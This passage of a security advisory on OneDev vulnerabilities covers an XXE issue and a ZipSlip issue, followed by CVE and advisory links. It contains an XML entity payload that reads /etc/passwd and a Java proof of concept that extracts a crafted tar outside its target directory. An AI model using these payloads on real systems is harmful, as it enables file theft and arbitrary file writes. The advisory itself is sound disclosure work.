the expansion of external entities. These entities can be configured to read arbitrary files from the file system and dump their contents in the final XML document to be migrated. If the files are dumped in properties included in the YAML file, it will be possible for an attacker to read them. Eg:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE data [
&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span>
]&gt;
<span class="nt">&lt;data&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/data&gt;</span>
</code></pre></div></div>

<p>If not, it is possible for an attacker to exfiltrate the contents of these files Out Of Band.</p>

<h4 id="impact-8">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">arbitrary file read</code></p>

<h3 id="issue-10-zipslip-arbitrary-file-upload">Issue 10: ZipSlip Arbitrary File Upload</h3>

<p><a href="https://github.com/theonedev/onedev/blob/main/server-core/src/main/java/io/onedev/server/plugin/executor/kubernetes/KubernetesResource.java"><code class="language-plaintext highlighter-rouge">KubernetesResource</code></a> REST endpoint untars user controlled data from the request body:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="nd">@POST</span>
	<span class="nd">@Path</span><span class="o">(</span><span class="s">"/upload-outcomes"</span><span class="o">)</span>
	<span class="nd">@Consumes</span><span class="o">(</span><span class="nc">MediaType</span><span class="o">.</span><span class="na">APPLICATION_OCTET_STREAM</span><span class="o">)</span>	
	<span class="kd">public</span> <span class="nc">Response</span> <span class="nf">uploadOutcomes</span><span class="o">(</span><span class="nc">InputStream</span> <span class="n">is</span><span class="o">)</span> <span class="o">{</span>
		<span class="nc">JobContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">jobManager</span><span class="o">.</span><span class="na">getJobContext</span><span class="o">(</span><span class="n">getJobToken</span><span class="o">(),</span> <span class="kc">true</span><span class="o">);</span>
		<span class="nc">TarUtils</span><span class="o">.</span><span class="na">untar</span><span class="o">(</span><span class="n">is</span><span class="o">,</span> <span class="n">context</span><span class="o">.</span><span class="na">getServerWorkspace</span><span class="o">());</span>
		<span class="k">return</span> <span class="nc">Response</span><span class="o">.</span><span class="na">ok</span><span class="o">().</span><span class="na">build</span><span class="o">();</span>
	<span class="o">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">TarUtils</code> is a custom library method leveraging Apache Commons Compress. During the untar process, there are no checks in place to prevent an untarred file from traversing the file system and overriding an existing file.</p>

<p>A test Tar file can be found in the <a href="https://github.com/snyk/zip-slip-vulnerability/blob/master/archives/zip-slip.tar"><code class="language-plaintext highlighter-rouge">snyck</code> repo</a>.</p>

<p>For a successful exploitation, the attacker requires a valid <code class="language-plaintext highlighter-rouge">__JobToken__</code> which may not be possible to get without using any of the other reported vulnerabilities. But this should be considered a vulnerability in <code class="language-plaintext highlighter-rouge">io.onedev.commons.utils.TarUtils</code> since it lives in a different artifact and can affect other projects using it.</p>

<p>To reproduce the vulnerability, we can use the following Java code:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">io.onedev.commons.utils.TarUtils</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">UnTarTest</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="nc">FileInputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="s">"./zip-slip.tar"</span><span class="o">));</span>
      <span class="nc">TarUtils</span><span class="o">.</span><span class="na">untar</span><span class="o">(</span><span class="n">is</span><span class="o">,</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="s">"./dest"</span><span class="o">));</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Using the Tar file mentioned above, after running the untar operation, a file called <code class="language-plaintext highlighter-rouge">evil.txt</code> should be extracted to <code class="language-plaintext highlighter-rouge">/tmp</code></p>

<h4 id="impact-9">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">arbitrary file write</code></p>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2021-21242</li>
  <li>CVE-2021-21243</li>
  <li>CVE-2021-21244</li>
  <li>CVE-2021-21245</li>
  <li>CVE-2021-21246</li>
  <li>CVE-2021-21247</li>
  <li>CVE-2021-21248</li>
  <li>CVE-2021-21249</li>
  <li>CVE-2021-21250</li>
  <li>CVE-2021-21251</li>
</ul>

<h2 id="resources">Resources</h2>
<ul>
  <li><a href="https://github.com/theonedev/onedev/security/advisories/GHSA-5q3q-f373-2jv8">Advisory 1 Pre-Auth deserialization</a></li>
  <li><a href="https://github.com/theonedev/onedev/security/advisories/GHSA-9mmq-fm8c-q4fv">Advisory 2 Pre-Auth deserialization</a></li>
  <li><a href="https://github.com/theonedev/onedev/security/advisories/GHSA-vm26-xg39-cfj4">Advisory 3 Pre-Auth SSTI</a></li>
  <li><a href="https://github.com/theonedev/onedev/security/advisories/GHSA-62m2-38q5-96w9">Advisory 4 File Upload</a></li>
  <li><a href="https://github.com/theonedev/onedev/security/advisories/GHSA-66v7-gg85-f4gx">Advisory 5 Token Leak</a></li>
  <li><a href="https://github.com/theonedev/onedev/security/advisories/GHSA-6pxf-75cf-vwjp">Advisory 6 Deserialization basepage</a></li>
  <li><a href="https://github.com/theonedev/onedev/security/advisories/GHSA-gwp4-5498-hv5f">Advisory 7 Groovy</a></li>
  <li><a href="https://github.com/theonedev/onedev/security/advisories/GHSA-7xhq-m2q9-6hpm">Advisory 8 YAML Deserialization</a></li>
  <li><a href="https://github.com/theonedev/onedev/security/advisories/GHSA-9pph-8gfc-6w2r">Advisory 9 XXE</a></li>
  <li><a href="https://github.com/theonedev/onedev/security/advisories/GHSA-2w6j-wc8c-9mq2">Advisory 10 ZipSlip</a></li>
</ul>

<h2 id="credit">Credit</h2>

<p>These issues was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-214_223</code> in any communication regarding this issue.</p>
